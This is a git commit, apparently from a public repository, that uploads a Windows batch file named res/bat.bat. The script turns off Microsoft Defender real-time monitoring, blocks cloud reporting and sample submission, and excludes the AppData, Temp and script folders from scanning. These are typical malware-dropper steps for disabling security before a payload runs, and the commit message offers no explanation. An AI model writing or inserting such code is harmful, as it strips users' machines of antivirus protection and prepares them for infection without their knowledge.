2926e3d9e89e4ace964cf92b69bd1b514884119a
tazebama57 <tazebama.mello@gmail.com>
2025-06-22 02:46:07 +0200

    Add files via upload

---
+++ res/bat.bat
@@ -0,0 +1,10 @@
+@echo off
+set "appdataPath=%APPDATA%"
+set "scriptDir=%~dp0"
+set "scriptDir=%scriptDir:~0,-1%"
+PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+PowerShell -Command "Set-MpPreference -MAPSReporting 0"
+PowerShell -Command "Set-MpPreference -SubmitSamplesConsent 2"
+PowerShell -Command "Add-MpPreference -ExclusionPath '%appdataPath%'"
+PowerShell -Command "Add-MpPreference -ExclusionPath '%scriptDir%'"
+PowerShell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Temp'"
